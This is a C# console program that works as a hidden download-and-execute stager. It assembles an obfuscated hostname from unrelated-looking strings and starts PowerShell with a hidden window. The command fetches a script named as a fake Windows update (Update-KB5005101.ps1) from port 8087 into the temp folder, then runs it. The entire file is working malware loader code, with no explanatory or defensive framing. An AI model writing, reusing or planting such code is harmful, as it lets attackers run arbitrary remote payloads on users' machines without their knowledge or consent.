using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var IndiaSailing = @"Colombo";
           var WarriorShepa = @"Viriato";
           var TerminalPath = @"powershell.exe";
           var FdxEstaMerda = @"HenrryTheNavigator";

           Process process = new Process();
           process.StartInfo.FileName = TerminalPath;
           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri http://"+WarriorShepa+IndiaSailing+FdxEstaMerda+":8087/Update-KB5005101.ps1 -outfile test.ps1;powershell -File test.ps1";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}
